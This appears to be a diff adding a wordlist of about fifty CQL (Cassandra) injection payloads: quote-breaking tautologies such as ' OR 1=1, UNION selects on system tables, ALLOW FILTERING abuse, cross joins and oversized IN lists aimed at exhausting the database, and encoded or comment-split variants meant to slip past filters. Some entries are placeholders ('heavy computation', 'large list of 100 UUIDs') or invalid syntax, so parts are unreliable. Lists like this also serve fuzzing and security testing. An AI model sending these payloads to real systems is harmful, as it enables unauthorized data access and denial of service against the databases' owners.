@@ -1,0 +1,51 @@
+' AND id IN (1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50) ALLOW FILTERING --
+' OR 1=1 AND SELECT COUNT(*) FROM system.local CROSS JOIN system.local --
+' AND (SELECT * FROM system.local LIMIT 1000000) --
+' aNd Id In (1,2,...,50) AlLoW fIlTeRiNg --
+%27%20AND%20id%20IN%20(1,2,...,50)%20ALLOW%20FILTERING%20--
+%2527%20AND%20id%20IN%20(1,2,...,50)%20ALLOW%20FILTERING%20--
+\u0027 AND id IN (1..50) ALLOW FILTERING --
+'/comment/AND/comment/id IN (1..50) ALLOW FILTERING --
+' AND id IN/* */ (1,2,...,50) ALLOW FILTERING --
+' AND//id IN (1,2,...,50) ALLOW//FILTERING --
+' OR id > 0 AND TOKEN(id) > TOKEN( uuid() ) --
+' AND (SELECT * FROM system.local LIMIT 100000 OFFSET 0) --
+' AND 1=(SELECT COUNT(*) FROM system.schema_columns CROSS JOIN system.schema_columns) --
+' UNION SELECT REPEAT('a',1000000) FROM system.local --
+' GROUP BY id HAVING COUNT(*) > 1000000 --
+' ORDER BY (SELECT COUNT(*) FROM system.local) --
+%27%20OR%201=1%20AND%20id%20IN%20(1..50)%20--
+' AND id IN (large list of 100 UUIDs) --
+' AND (large subquery with multiple CROSS JOINs) --
+\u0027\u0020AND\u0020id\u0020IN\u0020(1,2,...,50)\u0020ALLOW\u0020FILTERING\u0020--
+' AND id IN (1 to 10000 comma separated) ALLOW FILTERING --
+' AND SELECT * FROM system.peers LIMIT 100000 --
+' AND TOKEN(id) = TOKEN( heavy computation ) --
+' AND id > minTimeuuid('1970-01-01 00:00+0000') AND id < maxTimeuuid('2030-01-01 00:00+0000') ALLOW FILTERING --
+' OR 1=1 ALLOW FILTERING --
+%2527%20OR%201=1%20ALLOW%20FILTERING%20--
+'/foo/ OR 1=1 /bar/ ALLOW FILTERING --
+' OR/* */1=1 ALLOW FILTERING --
+' OR 1 = 1 ALLOW FILTERING --
+' OR 1=1--
+' OR 1=1#
+' OR 1=1 AND '1'='1
+' UNION ALL SELECT * FROM system.local --
+' AND (SELECT COUNT(*) FROM system.schema_keyspaces CROSS JOIN system.schema_tables) --
+' AND id IN (list of 10000 random ints) ALLOW FILTERING --
+' AND text_column LIKE '%' ALLOW FILTERING --
+' AND CONTAINS (tokenize('large text')) --
+' AND secondary_index > -999999999 ALLOW FILTERING --
+' GROUP BY id ORDER BY COUNT(*) DESC LIMIT 100000 --
+' AND (subselect with LIMIT 100000) --
+%27+OR+1=1+ALLOW+FILTERING+--
+' OR 1=1 /' or 1=1 or '" or 1=1 or "/ ALLOW FILTERING
+' AND id >= '00000000' AND id <= 'ffffffff' ALLOW FILTERING --
+' AND time > now() - 365d ALLOW FILTERING --
+' OR true ALLOW FILTERING --
+\u0027 OR true ALLOW FILTERING --
+' AND (SELECT COUNT(*) FROM system_size_estimates CROSS JOIN system_size_estimates) --
+' AND blob_column = blobAsBigAsPossible ALLOW FILTERING --
+' GROUP BY (id, large_computation) --
+' ORDER BY writetime(id) DESC LIMIT 100000 --
+' AND id IN (repeat 5000 times) ALLOW FILTERING --
